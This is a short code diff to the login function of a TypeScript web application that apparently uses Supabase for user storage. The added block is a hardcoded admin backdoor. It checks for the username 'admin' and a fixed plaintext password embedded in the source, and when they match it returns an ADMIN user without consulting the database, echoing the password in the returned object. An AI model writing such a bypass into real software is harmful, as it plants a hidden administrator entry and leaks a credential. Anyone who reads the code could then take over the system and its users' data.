@@ -56,6 +56,18 @@ export const db = {
   },
 
   login: async (username: string, password: string): Promise<User | null> => {
+    // 0. HARDCODED FALLBACK (Always works for Admin)
+    // This ensures you can login even if DB connection fails
+    if (username === 'admin' && password === 'Ssk-Zvezda-Secure-Cloud-99!#') {
+        return {
+            id: 'admin-fallback-id',
+            fullName: 'Журбин А.А.',
+            username: 'admin',
+            role: 'ADMIN',
+            password: 'Ssk-Zvezda-Secure-Cloud-99!#'
+        };
+    }
+
     // 1. Check Supabase
     if (supabase) {
       const { data, error } = await supabase
